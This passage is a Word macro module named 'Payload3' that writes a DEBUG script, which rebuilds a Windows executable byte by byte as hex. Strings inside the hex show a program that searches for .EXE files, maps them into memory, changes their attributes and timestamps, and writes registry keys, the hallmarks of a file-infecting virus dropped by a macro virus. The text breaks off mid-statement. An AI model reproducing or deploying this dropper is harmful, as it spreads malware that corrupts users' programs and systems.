Attribute VB_Name = "Payload3"

Public Sub MAIN()
Dim T$
T$ = Chr(13) + Chr(10)
WordBasic.Insert "Open " + Chr(34) + "C:\myscript.scr" + Chr(34) + _
" For Output As #1" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"n c:\myscript.exe" + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0100 4d 5a 50 00 02 00 00 00 04 00 0f 00 ff ff 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0110 b8 00 00 00 00 00 00 00 40 00 1a 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0120 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0130 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0140 ba 10 00 0e 1f b4 09 cd 21 b8 01 4c cd 21 90 90 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0150 54 68 69 73 20 70 72 6f 67 72 61 6d 20 6d 75 73 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0160 74 20 62 65 20 72 75 6e 20 75 6e 64 65 72 20 57 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0170 69 6e 33 32 0d 0a 24 37 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0180 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0190 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 01a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 01b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 01c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 01d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 01e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 01f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0200 50 45 00 00 4c 01 03 00 7e 26 3a aa 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0210 00 00 00 00 e0 00 8e 81 0b 01 02 19 00 16 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0220 00 04 00 00 00 00 00 00 00 10 00 00 00 10 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0230 00 30 00 00 00 00 40 00 00 10 00 00 00 02 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0240 01 00 00 00 00 00 00 00 03 00 0a 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0250 00 50 00 00 00 04 00 00 00 00 00 00 02 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0260 00 00 10 00 00 20 00 00 00 00 10 00 00 10 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0270 00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0280 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0290 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 02a0 00 40 00 00 a8 01 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 02b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 02c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 02d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 02e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 02f0 00 00 00 00 00 00 00 00 43 4f 44 45 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0300 00 20 00 00 00 10 00 00 00 16 00 00 00 06 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0310 00 00 00 00 00 00 00 00 00 00 00 00 20 00 00 60 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0320 44 41 54 41 00 00 00 00 00 10 00 00 00 30 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0330 00 02 00 00 00 1c 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0340 00 00 00 00 40 00 00 c0 2e 72 65 6c 6f 63 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0350 00 10 00 00 00 40 00 00 00 02 00 00 00 1e 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0360 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 50 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0370 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0380 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0390 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 03a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 03b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 03c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 03d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 03e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 03f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0400 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0410 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0420 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0430 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0440 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0450 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0460 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0470 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0480 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0490 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 04a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 04b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 04c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 04d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 04e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 04f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0500 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0510 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0520 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0530 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0540 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0550 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0560 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0570 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0580 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0590 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 05a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 05b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 05c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 05d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 05e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 05f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0600 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0610 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0620 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0630 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0640 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0650 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0660 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0670 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0680 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0690 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 06a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 06b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 06c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 06d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 06e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 06f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0700 e9 29 08 00 00 2a 2e 58 45 58 00 47 65 74 50 72 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0710 6f 63 41 64 64 72 65 73 73 00 45 78 69 74 50 72 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0720 6f 63 65 73 73 00 46 69 6e 64 46 69 72 73 74 46 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0730 69 6c 65 41 00 46 69 6e 64 4e 65 78 74 46 69 6c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0740 65 41 00 47 65 74 43 75 72 72 65 6e 74 44 69 72 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0750 65 63 74 6f 72 79 41 00 43 72 65 61 74 65 46 69 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0760 6c 65 4d 61 70 70 69 6e 67 41 00 4d 61 70 56 69 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0770 65 77 4f 66 46 69 6c 65 00 55 6e 6d 61 70 56 69 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0780 65 77 4f 66 46 69 6c 65 00 47 65 74 46 69 6c 65 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0790 41 74 74 72 69 62 75 74 65 73 41 00 53 65 74 46 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 07a0 69 6c 65 41 74 74 72 69 62 75 74 65 73 41 00 47 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 07b0 65 74 44 72 69 76 65 54 79 70 65 41 00 43 72 65 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 07c0 61 74 65 46 69 6c 65 41 00 43 6c 6f 73 65 48 61 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 07d0 6e 64 6c 65 00 47 65 74 46 69 6c 65 54 69 6d 65 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 07e0 00 53 65 74 46 69 6c 65 54 69 6d 65 00 53 65 74 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 07f0 46 69 6c 65 50 6f 69 6e 74 65 72 00 47 65 74 46 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0800 69 6c 65 53 69 7a 65 00 53 65 74 45 6e 64 4f 66 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0810 46 69 6c 65 00 47 65 74 53 79 73 74 65 6d 54 69 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0820 6d 65 00 47 65 74 4d 6f 64 75 6c 65 48 61 6e 64 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0830 6c 65 41 00 47 65 74 57 69 6e 64 6f 77 73 44 69 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0840 72 65 63 74 6f 72 79 41 00 47 65 74 53 79 73 74 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0850 65 6d 44 69 72 65 63 74 6f 72 79 41 00 53 65 74 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0860 43 75 72 72 65 6e 74 44 69 72 65 63 74 6f 72 79 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0870 41 00 44 65 6c 65 74 65 46 69 6c 65 41 00 47 6c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0880 6f 62 61 6c 41 6c 6c 6f 63 00 57 72 69 74 65 46 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0890 69 6c 65 00 ff 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 08a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 08b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 08c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 08d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 08e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 08f0 00 00 00 00 00 00 00 00 00 00 00 00 00 41 44 56 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0900 41 50 49 33 32 2e 64 6c 6c 00 52 65 67 43 72 65 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0910 61 74 65 4b 65 79 45 78 41 00 52 65 67 53 65 74 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0920 56 61 6c 75 65 45 78 41 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0930 00 4d 65 73 73 61 67 65 42 6f 78 41 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0940 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0950 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0960 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0970 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0980 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0990 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 09a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 09b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 09c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 09d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 09e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 09f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a70 00 00 00 00 00 00 00 00 00 00 00 00 00 47 65 74 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a80 4d 6f 64 75 6c 65 48 61 6e 64 6c 65 41 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a90 00 00 55 53 45 52 33 32 2e 64 6c 6c 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0aa0 00 00 40 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ab0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ac0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ad0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ae0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0af0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ba0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0bb0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0bc0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0bd0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0be0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0bf0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
